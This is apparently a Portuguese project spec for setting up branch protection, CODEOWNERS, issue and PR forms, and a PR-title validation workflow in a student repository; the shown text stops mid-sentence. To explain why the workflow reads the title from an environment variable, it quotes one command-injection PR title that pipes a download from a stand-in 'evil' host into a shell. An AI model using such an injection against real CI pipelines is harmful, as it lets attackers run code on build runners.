# OPS-05 — Proteção de branch, CODEOWNERS e templates

* **Responsável:** Gabriel Carvalho (DevOps)
* **Issue:** #20
* **Branch:** `chore/branch-protection-and-templates`
* **Rubrica:** 3,0 — Processo, Git & Documentação → **1,5 pt** "uso correto de branches, Pull Requests **aprovados pelo QA** e padrões de commit". É o único item da rubrica que não se prova com código: prova-se com configuração do repositório e com o histórico dos PRs.
* **Depende de:** OPS-03 (os nomes de job daquela spec são os *required status checks* configurados aqui) e OPS-01 (o job `Docker — build e smoke test do compose` só pode ser exigido depois de existir em `main`).

## Problema

O repositório recebido não tem **nenhum** mecanismo de processo. Não é que o
processo esteja fraco: ele não existe como artefato, só como intenção.

Medido em `docs/auditoria/metricas-baseline.md:162-174`:

| Item | Estado no recebimento |
|---|---|
| Issues | **0** |
| Commits | **10** |
| Pull requests | **2**, ambos mergeados |
| Templates de issue ou PR | **0** |
| `CODEOWNERS` | **não existe** |
| Proteção de branch em `main` | **não configurada** |
| Branches | 3 (`main`, `backend`, `frontend`) |
| Branch `develop` referenciada pela CI e pelo guia de contribuição | **não existe** |

As consequências são verificáveis uma por uma.

**Ninguém é obrigado a revisar nada.** Os 2 PRs do repositório recebido foram
mergeados sem revisão obrigatória, porque `main` aceita `git push` direto e
aceita merge sem aprovação. A rubrica da N2 cobra "Pull Requests **aprovados
pelo QA**". Hoje isso seria uma promessa verbal entre cinco pessoas sob prazo —
e `docs/time/overview.md:33-42` registra que o Igor acumula PO e QA, ou seja, a
pessoa que quer entregar é a mesma que deveria bloquear. Processo que depende de
todo mundo lembrar não é processo.

**Ninguém sabe quem revisa o quê.** `docs/time/overview.md:66-81` tem uma matriz
RACI com um `A` por linha, mas o GitHub não lê markdown. Sem `CODEOWNERS`, um PR
que mexe em `server/src/` não convoca o Backend nem o QA: fica esperando que
alguém note.

**Issue não tem forma.** O repositório tem 0 issues e a
`Documentação Oficial SREC.md` afirma "Rastreabilidade: todas as tarefas
mapeadas no Jira" — divergência nº 9 de
`docs/auditoria/divergencias-doc-codigo.md`. Não há Jira e não havia issue. A N2
abre 26 issues; sem formulário, cada uma teria um formato diferente e a
Definition of Ready de `docs/time/overview.md:93-98` (spec apontada, arquivo e
linha, evidência, critérios de aceite, dependências, item da rubrica) seria
verificada de memória.

**PR não tem forma.** A Definition of Done de `docs/time/overview.md:100-111`
tem 8 itens. Sem template, o QA precisa lembrar dos 8 em cada um dos 26 PRs. O
oitavo item — "nenhum arquivo fora do escopo da issue foi alterado" — é o mais
fácil de esquecer e o mais caro de perder, porque é ele que mantém a
rastreabilidade entre o achado da auditoria e a correção, que é exatamente o que
o pitch (QA-04) precisa demonstrar.

**O padrão de commit não é validado por nada.** A convenção da N2
(`CONTEXTO`/§9 e `docs/time/overview.md:108`) é Conventional Commits em
português no imperativo. Hoje nada impede `atualizado arquivos` de entrar na
`main` — e o histórico recebido, com 10 commits, é o que o grupo da N3 vai ler
para entender o que aconteceu.

**E o guia de contribuição aponta para um branch inexistente.** Divergência
nº 10: o documento recebido manda criar branch a partir de `develop`, que não
existe. OPS-03 tira `develop` do gatilho da CI; esta spec é quem registra, no
lugar que o GitHub lê, que `main` é o único branch longevo e que ele é protegido.

## Evidência

Comandos que reproduzem o baseline. Rodar com `gh auth status` já resolvido.

```bash
# Issues e PRs do repositório recebido
gh issue list --repo MAGUGI/SREC --state all --json number | jq length     # => 0
gh pr list    --repo MAGUGI/SREC --state all --json number | jq length     # => 2
git -C . log --oneline | wc -l                                             # => 10

# Templates, CODEOWNERS
ls .github/                      # => workflows/   (só isso)
ls .github/ISSUE_TEMPLATE 2>&1   # => No such file or directory
ls .github/CODEOWNERS 2>&1       # => No such file or directory
ls .github/pull_request_template.md 2>&1  # => No such file or directory

# Proteção de branch
gh api /repos/igorSeberino/srec/branches/main/protection
# => 404 {"message":"Branch not protected", ...}

# develop não existe, e a CI e o guia o citam
git branch -r
# => origin/HEAD -> origin/main, origin/main, origin/backend, origin/frontend
grep -n 'develop' .github/workflows/ci.yml 'Documentação Oficial SREC.md'
```

Prova prática de que `main` está aberta — **não executar em `main`**, é só para
entender o que está em jogo:

```bash
echo '' >> README.md && git commit -am 'teste' && git push origin main
# Hoje: aceito. Depois desta spec: rejeitado com
#   remote: error: GH006: Protected branch update failed for refs/heads/main.
```

As labels, por outro lado, **já existem** no repositório e esta spec não cria
nenhuma — ela as consome nos formulários:

```bash
gh label list --repo igorSeberino/srec --limit 50
# bug do cliente · debito tecnico · code smell
# area: backend · area: frontend · area: infra · area: docs · area: qa
# sev: critico · sev: alto · sev: medio · sev: baixo
# N2 · N3 · herdado
```

Divergência encontrada ao conferir isso: `docs/time/overview.md:123` chama a
label de `débito técnico`, com acento. A label que **existe** é
`debito tecnico`, sem acento. O YAML dos formulários usa o nome real — YAML com
nome de label inexistente falha silenciosamente na criação da issue, sem erro
visível — e o texto do `overview.md` é corrigido no mesmo PR.

## Decisão

**Mover o processo para dentro do GitHub: `CODEOWNERS` para dizer quem aprova,
proteção de branch via API para tornar a aprovação obrigatória, formulários para
dar forma a issue e PR, e um workflow próprio para validar o padrão de commit.**

Tudo aplicado por comando versionado nesta spec, não por cliques na interface.
Clique não tem histórico, não tem revisão e não sobrevive ao handoff da N3.

### A pegadinha do repositório de usuário — e por que ela afeta o Igor

Isto é o ponto mais importante da spec, porque é onde a configuração "óbvia"
trava o time.

`igorSeberino/srec` é um **repositório de usuário**, não de organização. Três
regras do GitHub se combinam de forma desagradável aqui:

1. **`CODEOWNERS` por si só não obriga nada.** Sem proteção de branch, ele
   apenas *sugere* revisores automaticamente. A revisão só se torna requisito
   com `required_pull_request_reviews.require_code_owner_reviews: true` na
   proteção de `main`. Criar o arquivo e parar aí é o erro mais comum, e produz
   a sensação de processo sem o processo.
2. **Dono de código precisa ter permissão de escrita.** Em repositório de
   usuário não há *teams*: cada pessoa precisa ser colaboradora com permissão
   `push`. Uma entrada de `CODEOWNERS` apontando para quem não tem escrita é
   **ignorada em silêncio** — o portão fica aberto e o arquivo parece correto.
   Por isso o passo a passo adiciona os quatro colaboradores **antes** de
   ativar a proteção, e o aceite inclui
   `gh api /repos/igorSeberino/srec/codeowners/errors` devolvendo lista vazia.
3. **O autor do PR não pode aprovar o próprio PR.** O GitHub bloqueia, e não há
   configuração que mude isso.

Agora juntando com a nossa realidade: **o Igor é dono do repositório e é o QA
aprovador.** Se `CODEOWNERS` tivesse só a linha `* @igorSeberino`, todo PR em
que o Igor é o autor ficaria **impossível de mesclar** — ele é o único dono, e
não pode se auto-aprovar. Os PRs do Igor são QA-01, QA-02, QA-03 e QA-04:
quatro das 26 issues, incluindo as duas que sustentam o pitch.

A saída adotada tem duas partes.

**Parte 1 — cada linha de dono de pasta repete o QA e acrescenta o dono da
área.** Isto resolve o travamento para quase tudo, por um motivo que vale
escrever: dentro de uma linha de `CODEOWNERS` a semântica é **OU** (a aprovação
de qualquer um dos donos listados satisfaz o portão), mas cada área da N2 tem
**exatamente um autor**. Logo:

| PR | Pasta tocada | Donos da linha | Quem pode aprovar na prática |
|---|---|---|---|
| BE-01..BE-08 (autor Adrian) | `/server/` | `@igorSeberino @adrian-cesar` | só o **Igor** — o Adrian é o autor |
| FE-01..FE-05 (autor Renato) | `/client/` | `@igorSeberino @RenatoColin` | só o **Igor** |
| OPS-01..OPS-05 (autor Gabriel) | `/.github/`, compose | `@igorSeberino @gabrielcarvallho` | só o **Igor** |
| REQ-01..REQ-04 (autor Diego) | `/docs/` | `@igorSeberino @Diegonessler` | só o **Igor** |
| QA-01, QA-02 (autor Igor) | `/server/` | `@igorSeberino @adrian-cesar` | o **Adrian** |
| QA-03, QA-04 (autor Igor) | `/docs/` | `@igorSeberino @Diegonessler` | o **Diego** |

Ou seja: a regra "o QA aprova tudo" é satisfeita **tecnicamente** em 22 dos 26
PRs, e nos 4 PRs do próprio QA o segundo dono da área assume a revisão — o que é
o comportamento correto, não um furo: alguém tem que revisar o trabalho do
revisor.

**Parte 2 — `enforce_admins: false`, deliberadamente.** Resta um caso que ainda
trava: um PR do Igor que toque **apenas** arquivos cobertos pela linha `*`
(`README.md`, `CLAUDE.md`, `.gitignore`, `Documentação Oficial SREC.md`). Nesses
arquivos o único dono é ele mesmo. Com `enforce_admins: true`, esse PR seria
inmesclável e a reação previsível seria desligar a proteção inteira — que é como
proteção de branch morre na prática.

Então `enforce_admins` fica em `false`, com três amarras:

* A regra escrita: **o bypass de admin só é usado quando o travamento é técnico
  (autor é o único dono possível), e o motivo vai declarado no corpo do PR.**
* O PR precisa, ainda assim, da aprovação registrada de outra pessoa do time —
  aprovação que fica no histórico do PR mesmo não sendo exigida pela proteção.
* O bypass **deixa rastro**: o GitHub registra na timeline do PR que a proteção
  foi contornada, e quem auditar vê. Isso é o argumento decisivo contra a
  alternativa óbvia.

**Por que não a alternativa óbvia** (colocar `* @igorSeberino @gabrielcarvallho`
e deixar o Gabriel como dono universal): porque aí o Gabriel passaria a poder
aprovar **qualquer** PR em lugar do QA, silenciosamente, sem rastro nenhum. O
portão deixaria de significar "o QA aprovou" e passaria a significar "alguém
dos dois aprovou" — e a rubrica cobra o primeiro. Entre um furo auditável e
usado quatro vezes, e um furo invisível disponível 26 vezes, escolhemos o
auditável.

**Pegadinha de ordenação, dentro do próprio arquivo:** em `CODEOWNERS` **vale a
última linha que casa com o caminho**, não a soma delas. Uma linha
`/server/ @adrian-cesar` sozinha, logo abaixo de `* @igorSeberino`,
**removeria o QA do portão do backend** — exatamente o contrário do que a
rubrica pede, e de um jeito que ninguém percebe lendo o arquivo rápido. É por
isso que `@igorSeberino` aparece em **todas** as linhas, sempre em primeiro
lugar.

### Por que `squash` com título do PR como mensagem de commit

O workflow `pr-title.yml` valida o título do PR contra Conventional Commits. Só
isso não garante nada na `main`: o merge poderia gravar `Merge pull request #42
from igorSeberino/fix/...`. Então a configuração do repositório passa a:

* permitir **apenas** squash merge (`allow_merge_commit=false`,
  `allow_rebase_merge=false`);
* usar `squash_merge_commit_title=PR_TITLE`.

Resultado mensurável: **100 % dos commits que entram em `main` a partir deste PR
têm mensagem validada por CI**, porque a mensagem *é* o título validado. Validar
cada commit da branch (com `commitlint` sobre o range) foi a alternativa
considerada e recusada: commit de trabalho em branch curta é rascunho, e
reprovar `wip` numa branch pessoal gasta a paciência do time sem proteger a
`main`, que é o que importa.

`required_linear_history: true` acompanha, por coerência: squash produz
histórico linear, e um merge commit entrando por outra via quebraria a leitura
de `git log --oneline` que o grupo da N3 vai fazer.

### Por que o validador de título é um script, e não uma action de terceiros

Mesma razão registrada em OPS-03 para o comentário de cobertura: uma action de
terceiros no caminho do portão ganharia permissão no repositório que a
disciplina vai auditar. O validador aqui são 20 linhas de `bash` com `grep -E`,
e ele lê o título **por variável de ambiente**, nunca interpolado direto no
`run:`. Interpolar `${{ github.event.pull_request.title }}` dentro de um shell
script é injeção de comando clássica: um PR intitulado
`fix: a"; curl evil.sh | sh; #` executaria no runner. Com `env:`, o título é
dado, não código.

### Por que três formulários, e não um

Os três tipos de trabalho da N2 pedem campos diferentes e disparam fluxos
diferentes:

| Formulário | Para quê | Campos próprios | Labels fixas |
|---|---|---|---|
| Bug do cliente | os 15 defeitos de `docs/auditoria/bugs-do-cliente.md` e o que aparecer | severidade, reprodução, resultado esperado vs obtido, arquivo e linha | `bug do cliente`, `N2`, `herdado` |
| Débito técnico | atalho assumido, com a política de `docs/time/overview.md:120-129` | motivo do atalho, impacto, proposta, origem (herdado vs criado-n2) | `debito tecnico`, `N2` |
| Refatoração | os 14 code smells de `docs/auditoria/code-smells.md` | smell, evidência numérica, métrica antes, métrica alvo | `code smell`, `N2`, `herdado` |

O formulário de refatoração é o que mais carrega a rubrica: ele **obriga** o
campo "métrica antes" e "métrica alvo" no momento de abrir a issue. Sem isso, o
relatório antes/depois de QA-04 viraria arqueologia no fim da entrega.

**Limitação real do mecanismo, registrada para não virar surpresa:** formulário
de issue do GitHub **não transforma resposta de dropdown em label**. O campo
`labels:` do YAML é fixo. Então a severidade e a área são escolhidas no dropdown
(ficam no corpo da issue, legíveis e obrigatórias) e o PO aplica a label
correspondente na triagem, com uma linha de comando. Alternativa descartada:
criar quatro formulários de bug, um por severidade. Multiplicaria a manutenção
por quatro para automatizar um `gh issue edit`.

## Alterações

### 1. `.github/CODEOWNERS` — criar

```
# CODEOWNERS — SREC, entrega N2
#
# Este arquivo só tem efeito de REVISÃO OBRIGATÓRIA porque a proteção de `main`
# está com require_code_owner_reviews: true. Ver a seção "Decisão" de
# docs/specs/ops-05-branch-protection-and-templates/implementacao.md.
#
# Duas regras do GitHub que explicam o formato abaixo:
#
# 1. Vale a ÚLTIMA linha que casa com o caminho, não a soma das linhas. Uma
#    linha "/server/ @adrian-cesar" sozinha tiraria o QA do portão do backend.
#    Por isso @igorSeberino (QA) aparece em TODAS as linhas, em primeiro lugar.
# 2. Dentro de uma linha a semântica é OU: a aprovação de qualquer um dos donos
#    satisfaz o portão. Como cada área da N2 tem exatamente um autor, e autor
#    não aprova o próprio PR, na prática quem aprova é o QA — exceto nos PRs do
#    próprio QA, onde o segundo dono da área assume a revisão.
#
# Dono de código precisa ter permissão de escrita no repositório. Confira com:
#   gh api /repos/igorSeberino/srec/codeowners/errors

# Padrão: o QA é dono de tudo.
# Rubrica N2 — 1,5 pt de "Pull Requests aprovados pelo QA".
*                           @igorSeberino

# Backend Express + PostgreSQL
/server/                    @igorSeberino @adrian-cesar

# Frontend React + Vite
/client/                    @igorSeberino @RenatoColin

# Requisitos, arquitetura, auditoria, specs e handoff
/docs/                      @igorSeberino @Diegonessler

# Automação, CI, templates e ambiente reproduzível.
# Vem depois de /server/ e /client/ de propósito: os Dockerfiles são do DevOps,
# e a última linha que casa é a que vale.
/.github/                   @igorSeberino @gabrielcarvallho
/docker-compose.yml         @igorSeberino @gabrielcarvallho
/docker-compose.test.yml    @igorSeberino @gabrielcarvallho
/server/Dockerfile          @igorSeberino @gabrielcarvallho
/server/docker-compose.test.yml @igorSeberino @gabrielcarvallho
/client/Dockerfile          @igorSeberino @gabrielcarvallho
/client/nginx.conf          @igorSeberino @gabrielcarvallho
```

As entradas de Docker e `nginx.conf` pressupõem OPS-01. Se OPS-01 ainda não
estiver em `main`, as linhas ficam: `CODEOWNERS` não reclama de caminho
inexistente, e o endpoint `codeowners/errors` só acusa dono inválido, não
caminho ausente. Verificar na saída do comando, não presumir.

### 2. `.github/pull_request_template.md` — criar

O checklist é a Definition of Done de `docs/time/overview.md:100-111`, item por
item. Note que "aprovado pelo QA" **não** é caixa do autor: é seção separada,
porque quem marca é o revisor.

````markdown
## O que muda

<!-- Uma frase. O quê, e por quê. -->

## Issue

Fecha #<n>

<!-- Achado da auditoria que isto resolve, se houver: BUG-xx, CS-xx, divergência nº x -->
Resolve: <BUG-xx | CS-xx | divergência nº x | n/a>
Spec: `docs/specs/<slug>/implementacao.md`

## Antes / depois

<!-- Obrigatório quando o PR afirma melhoria. Nenhuma linha sem número nos dois
     lados: "melhoramos a qualidade" não conta. Rubrica N2 — pitch com dados. -->

| Métrica | Antes (medido) | Depois (medido) | Comando |
|---|---|---|---|
|  |  |  |  |

## Como verificar

<!-- Sequência que o revisor roda para conferir. Comando de verdade. -->

```bash

```

## Definition of Done

Checklist de `docs/time/overview.md`. Marque só o que for verdade — caixa
marcada por otimismo é pior do que caixa vazia.

- [ ] O comportamento descrito nos critérios de aceite foi verificado de fato.
- [ ] Existe teste automatizado cobrindo a mudança; para correção de bug,
      existe o teste que **falhava antes** (cole a saída do antes e do depois).
- [ ] A suíte inteira passa e a cobertura **não caiu**.
- [ ] A CI está verde, incluindo lint e build.
- [ ] Os commits seguem Conventional Commits em português, no imperativo.
- [ ] A documentação afetada foi atualizada **neste mesmo PR**.
- [ ] Nenhum arquivo fora do escopo da issue foi alterado.

## Rubrica

<!-- Qual item dos 10 pontos da N2 este PR pontua. -->

## Para o QA (@igorSeberino)

Preenchido pelo revisor, não pelo autor.

- [ ] Os 7 itens acima foram conferidos, não apenas lidos.
- [ ] O diff não traz arquivo fora do escopo da issue.
- [ ] Aprovado — a aprovação registrada aqui é o que a rubrica N2 cobra.

<!-- Se este PR foi aberto pelo próprio QA e o merge precisou do bypass de
     admin, declare aqui o motivo e quem revisou no lugar dele. Ver a seção
     "Decisão" em docs/specs/ops-05-branch-protection-and-templates/. -->
````

### 3. `.github/ISSUE_TEMPLATE/config.yml` — criar

Desliga a issue em branco: 26 issues com formato garantido valem mais do que a
liberdade de abrir uma sem campo nenhum, que é como se chega a 0 issues
rastreáveis.

```yaml
blank_issues_enabled: false
contact_links:
  - name: Relatório de auditoria da N2
    url: https://github.com/igorSeberino/srec/blob/main/docs/auditoria/relatorio-n2.md
    about: Antes de abrir, confira se o achado já está catalogado (15 bugs, 14 code smells, 12 divergências).
  - name: Papéis, DoR e DoD do time
    url: https://github.com/igorSeberino/srec/blob/main/docs/time/overview.md
    about: Quem aprova o quê, e o que é preciso para a issue entrar em desenvolvimento.
```

### 4. `.github/ISSUE_TEMPLATE/bug-do-cliente.yml` — criar

```yaml
name: Bug do cliente
description: Defeito que produz comportamento errado no sistema recebido.
title: 'BUG — '
labels: ['bug do cliente', 'N2']
body:
  - type: markdown
    attributes:
      value: |
        Antes de abrir: confira se o defeito já está em
        [`docs/auditoria/bugs-do-cliente.md`](https://github.com/igorSeberino/srec/blob/main/docs/auditoria/bugs-do-cliente.md).
        Se já estiver, use o ID existente (BUG-01 a BUG-15) no título.

  - type: input
    id: bug-id
    attributes:
      label: ID do catálogo
      description: BUG-01 a BUG-15 se já catalogado; "novo" se foi encontrado agora.
      placeholder: BUG-04
    validations:
      required: true

  - type: dropdown
    id: severidade
    attributes:
      label: Severidade
      description: |
        Escala de `docs/auditoria/bugs-do-cliente.md`.
        O PO aplica a label `sev:` correspondente na triagem.
      options:
        - 'CRÍTICO — quebra a regra de negócio central ou perde dado do usuário'
        - 'ALTO — produz resposta errada, derruba o serviço ou corrompe estado'
        - 'MÉDIO — permite dado inválido entrar no sistema ou degrada a operação'
        - 'BAIXO — incomoda o usuário ou suja o código, sem perder dado'
    validations:
      required: true

  - type: dropdown
    id: area
    attributes:
      label: Área
      description: O PO aplica a label `area:` correspondente na triagem.
      options:
        - 'backend'
        - 'frontend'
        - 'infra'
        - 'docs'
        - 'qa'
    validations:
      required: true

  - type: input
    id: onde
    attributes:
      label: Arquivo e linha
      description: Exigência da Definition of Ready. Sem arquivo e linha, a issue não entra em desenvolvimento.
      placeholder: server/src/controllers/reservationController.js:12-28
    validations:
      required: true

  - type: textarea
    id: reproducao
    attributes:
      label: Como reproduzir
      description: Passos numerados ou comando que qualquer pessoa do time roda e vê o defeito.
      render: shell
      placeholder: |
        curl -i http://localhost:5000/api/resources/abc
    validations:
      required: true

  - type: textarea
    id: esperado
    attributes:
      label: Resultado esperado
      placeholder: '400 Bad Request, com mensagem indicando que o id precisa ser numérico.'
    validations:
      required: true

  - type: textarea
    id: obtido
    attributes:
      label: Resultado obtido
      placeholder: '500 {"error":"Internal server error"}'
    validations:
      required: true

  - type: textarea
    id: impacto
    attributes:
      label: Impacto
      description: O que acontece com o usuário ou com o dado. Uma ou duas frases.
    validations:
      required: true

  - type: input
    id: spec
    attributes:
      label: Spec que corrige
      description: Caminho da spec de implementação, se já existir.
      placeholder: docs/specs/be-05-proper-http-status-codes/implementacao.md
    validations:
      required: false

  - type: checkboxes
    id: dor
    attributes:
      label: Definition of Ready
      description: 'Conforme `docs/time/overview.md`. O PO valida antes de priorizar.'
      options:
        - label: Existe evidência do problema (comando de reprodução ou número medido).
          required: true
        - label: Os critérios de aceite estão objetivos e verificáveis.
          required: true
        - label: As dependências de outras issues estão declaradas.
          required: true
        - label: Está claro qual item da rubrica da N2 este trabalho pontua.
          required: true
```

### 5. `.github/ISSUE_TEMPLATE/debito-tecnico.yml` — criar

Implementa a política de `docs/time/overview.md:120-129`: todo atalho vira issue
**no momento em que é criado**, com motivo, impacto e proposta.

```yaml
name: Débito técnico
description: Atalho, pendência ou workaround assumido deliberadamente.
title: 'DÉBITO — '
labels: ['debito tecnico', 'N2']
body:
  - type: markdown
    attributes:
      value: |
        Política do time: o débito é registrado **no momento em que é criado**,
        não no fim da entrega. Entregar débito conhecido e documentado é honesto;
        entregar débito escondido é o que gerou os 6,14 % de cobertura que
        recebemos.

  - type: textarea
    id: descricao
    attributes:
      label: Qual é o atalho
      description: O que foi feito, e o que deveria ter sido feito.
    validations:
      required: true

  - type: dropdown
    id: origem
    attributes:
      label: Origem
      description: |
        `herdado` = veio do código recebido do grupo MAGUGI.
        `criado-n2` = nós criamos nesta entrega.
        O PO aplica a label `herdado` quando for o caso.
      options:
        - 'herdado — veio no código recebido'
        - 'criado-n2 — assumido por nós nesta entrega'
    validations:
      required: true

  - type: textarea
    id: motivo
    attributes:
      label: Por que o atalho foi tomado
      description: Prazo, dependência externa, decisão de escopo. Seja específico; "falta de tempo" não explica nada em dezembro.
    validations:
      required: true

  - type: dropdown
    id: prioridade
    attributes:
      label: Afeta alguma das três prioridades máximas?
      description: 'Critério de `docs/time/overview.md`: regra de negócio central, segurança, ou capacidade do time de trabalhar.'
      options:
        - 'Sim — a regra de negócio central (não sobrepor reservas)'
        - 'Sim — segurança'
        - 'Sim — a capacidade do time de trabalhar (ambiente, teste, CI)'
        - 'Não — pode esperar a N3'
    validations:
      required: true

  - type: textarea
    id: impacto
    attributes:
      label: Impacto estimado
      description: Com número quando houver. "Cada mudança de contrato da API exige editar 10 arquivos" vale; "dificulta a manutenção" não.
    validations:
      required: true

  - type: textarea
    id: proposta
    attributes:
      label: Proposta de solução
      description: O que precisaria ser feito para liquidar. Não precisa estar pronto para implementar, precisa estar claro.
    validations:
      required: true

  - type: dropdown
    id: quando
    attributes:
      label: Quando se pretende liquidar
      description: 'O PO aplica a label `N2` ou `N3`. A reserva de esforço do ciclo para débito é de ~15 %.'
      options:
        - 'Ainda na N2'
        - 'Fica para a N3 (vai no handoff)'
    validations:
      required: true
```

### 6. `.github/ISSUE_TEMPLATE/refatoracao.yml` — criar

```yaml
name: Tarefa de refatoração
description: Resolver um code smell, sem mudar comportamento observável.
title: 'REFACTOR — '
labels: ['code smell', 'N2']
body:
  - type: markdown
    attributes:
      value: |
        Refatoração **não muda comportamento**. Se o comportamento muda, é bug
        ou feature, e o formulário é outro.

        Esta issue exige métrica antes e métrica alvo. É o que transforma
        "melhoramos a qualidade" em "o maior `.jsx` saiu de 351 para 58 linhas".

  - type: input
    id: smell-id
    attributes:
      label: ID do catálogo
      description: CS-01 a CS-14 de `docs/auditoria/code-smells.md`; "novo" se foi encontrado agora.
      placeholder: CS-01
    validations:
      required: true

  - type: dropdown
    id: severidade
    attributes:
      label: Severidade do smell
      description: O PO aplica a label `sev:` correspondente na triagem.
      options:
        - 'ALTO'
        - 'MÉDIO'
        - 'BAIXO'
    validations:
      required: true

  - type: dropdown
    id: area
    attributes:
      label: Área
      options:
        - 'backend'
        - 'frontend'
        - 'infra'
        - 'docs'
        - 'qa'
    validations:
      required: true

  - type: textarea
    id: evidencia
    attributes:
      label: Evidência
      description: Comando que mede o smell, com a saída. Sem comando, não é evidência — é opinião.
      render: shell
      placeholder: |
        $ grep -c 'catch (err)' server/src/controllers/*.js
        server/src/controllers/reservationController.js:5
        server/src/controllers/resourceController.js:5
    validations:
      required: true

  - type: input
    id: metrica-antes
    attributes:
      label: Métrica — valor antes (medido)
      placeholder: '10 blocos try/catch idênticos'
    validations:
      required: true

  - type: input
    id: metrica-alvo
    attributes:
      label: Métrica — valor alvo
      placeholder: '0 blocos duplicados, com um middleware de erro registrado uma vez'
    validations:
      required: true

  - type: textarea
    id: custo
    attributes:
      label: Custo de manutenção que o smell impõe hoje
      description: Por que isto encarece a próxima mudança. É o argumento que justifica gastar tempo em algo que "já funciona".
    validations:
      required: true

  - type: checkboxes
    id: garantias
    attributes:
      label: Garantias de que o comportamento não muda
      options:
        - label: Existe teste automatizado cobrindo o comportamento atual ANTES da refatoração, ou ele será escrito primeiro.
          required: true
        - label: O roteiro de regressão manual (`docs/qa/roteiro-regressao.md`) será executado antes e depois, com os dois registros anexados ao PR.
          required: true
        - label: Nenhum endpoint, nome de campo da API ou texto visível ao usuário muda neste PR.
          required: false
```

A última caixa é a única opcional do conjunto: FE-01 corrige literais visíveis
ao usuário em alguns pontos, e exigir "nada muda" obrigaria a mentir no
formulário.

### 7. `.github/workflows/pr-title.yml` — criar

```yaml
name: Padrão de commit

on:
  pull_request:
    types: [opened, edited, reopened, synchronize]

permissions:
  contents: read

concurrency:
  group: pr-title-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  pr-title:
    name: Título do PR (Conventional Commits)
    runs-on: ubuntu-latest
    steps:
      - name: Validar o título contra Conventional Commits
        env:
          # O título vem por variável de ambiente, NUNCA interpolado dentro do
          # script: ${{ ... }} direto no `run` é injeção de comando.
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          set -uo pipefail

          # Tipos da convenção da N2 (docs/time/overview.md) mais `style`,
          # usado por OPS-03 para commits de reformatação, e `revert`.
          TIPOS='feat|fix|refactor|docs|test|chore|perf|build|ci|style|revert'
          PADRAO="^(${TIPOS})(\([a-z0-9][a-z0-9._/-]*\))?!?: .+$"

          erros=0

          echo "Título recebido: ${PR_TITLE}"

          if ! printf '%s' "$PR_TITLE" | grep -Eq "$PADRAO"; then
            echo "::error::O título não segue Conventional Commits."
            echo "::error::Formato: <tipo>(<escopo opcional>): <descrição no imperativo>"
            echo "::error::Tipos aceitos: ${TIPOS}"
            erros=$((erros + 1))
          fi

          if [ "${#PR_TITLE}" -gt 72 ]; then
            echo "::error::O título tem ${#PR_TITLE} caracteres; o limite é 72."
            erros=$((erros + 1))
          fi

          case "$PR_TITLE" in
            *.) echo "::error::O título não termina em ponto."; erros=$((erros + 1)) ;;
          esac

          descricao="${PR_TITLE#*: }"
          primeira="$(printf '%s' "$descricao" | cut -c1)"
          if printf '%s' "$primeira" | grep -Eq '[A-ZÀ-Ý]'; then
            echo "::error::A descrição começa em minúscula: '${primeira}' → '$(printf '%s' "$primeira" | tr '[:upper:]' '[:lower:]')'."
            erros=$((erros + 1))
          fi

          # Heurística de imperativo: só AVISA, não reprova. Português tem
          # exceção suficiente para que reprovar aqui gere falso positivo.
          primeiro_verbo="$(printf '%s' "$descricao" | cut -d' ' -f1)"
          if printf '%s' "$primeiro_verbo" | grep -Eq '(ado|ada|ados|adas|indo|ando|endo)$'; then
            echo "::warning::'${primeiro_verbo}' parece particípio ou gerúndio. A convenção é imperativo: 'adicionar', não 'adicionado'/'adicionando'."
          fi

          {
            echo '### Padrão de commit'
            echo ''
            echo '```'
            echo "${PR_TITLE}"
            echo '```'
            echo ''
            if [ "$erros" -eq 0 ]; then
              echo 'Título válido. Com squash merge e `squash_merge_commit_title=PR_TITLE`,'
              echo 'é exatamente esta a mensagem que entra na `main`.'
            else
              echo "**${erros} problema(s).** Exemplos válidos:"
              echo ''
              echo '* `fix(reservations): impedir dupla reserva concorrente`'
              echo '* `refactor(client): extrair formulário de reserva de App.jsx`'
              echo '* `ci: subir postgres no job de backend`'
              echo '* `docs(qa): adicionar roteiro de regressão manual`'
            fi
          } >> "$GITHUB_STEP_SUMMARY"

          exit "$erros"
```

Detalhe que custa uma hora de depuração se passar batido: sem o tipo de evento
`edited`, corrigir o título não reexecuta o check e o PR fica travado num
vermelho já resolvido.

### 8. `docs/time/fluxo-tbd.md` — criar

`docs/time/overview.md:157` já linka para este arquivo, e ele **não existe** no
repositório. Esta spec cria a parte que é dela — o portão do PR, os checks
obrigatórios e a regra de bypass. O fluxo de branch e o padrão de commit em si
são de REQ-04/handoff; se este arquivo já tiver sido criado por outra spec,
acrescente só a seção abaixo.

```markdown
## Portão do Pull Request

`main` é o único branch longevo e é protegida. O que a proteção exige, em ordem
de verificação:

| Exigência | Configuração | Por quê |
|---|---|---|
| PR obrigatório | `required_pull_request_reviews` | `git push` direto em `main` é rejeitado |
| 1 aprovação | `required_approving_review_count: 1` | rubrica N2 — PRs aprovados pelo QA |
| Aprovação de dono de código | `require_code_owner_reviews: true` | é o que torna `.github/CODEOWNERS` obrigatório, e não só sugestivo |
| Aprovação do último push | `require_last_push_approval: true` | commit novo depois do "aprovado" não entra sem revisão |
| Aprovações caem a cada push | `dismiss_stale_reviews: true` | aprovação se refere ao código revisado, não ao nome da branch |
| Conversas resolvidas | `required_conversation_resolution: true` | comentário do QA não se resolve com silêncio |
| CI verde | `required_status_checks` | ver a lista abaixo |
| Histórico linear | `required_linear_history: true` | squash merge, `git log --oneline` legível para a N3 |
| Sem force push, sem deleção | `allow_force_pushes: false`, `allow_deletions: false` | histórico de `main` é imutável |

### Checks obrigatórios

| Check | Vem de |
|---|---|
| `Backend — lint, formato, auditoria e testes` | OPS-03 |
| `Frontend — lint, formato e build` | OPS-03 |
| `Docker — build e smoke test do compose` | OPS-01 |
| `Título do PR (Conventional Commits)` | OPS-05 |

`Relatório de qualidade (não bloqueante na Fase 1)` **não** está na lista, de
propósito: ver as fases em `.github/workflows/README.md`.

### Mensagem de commit em `main`

Só squash merge é permitido, e o título do PR vira a mensagem do commit
(`squash_merge_commit_title=PR_TITLE`). Como o título é validado pela CI, todo
commit em `main` tem mensagem em Conventional Commits, por construção.

### Bypass de admin

`enforce_admins` está em `false`. Isso existe por um motivo técnico único: um PR
cujo autor é o único dono de código possível dos arquivos tocados não pode ser
aprovado por ninguém (o GitHub não permite auto-aprovação). Acontece com PRs do
QA que tocam apenas arquivos da raiz.

Regra: **o bypass só é usado nesse caso, outra pessoa do time registra a
aprovação no PR mesmo não sendo exigida, e o motivo vai escrito no corpo do
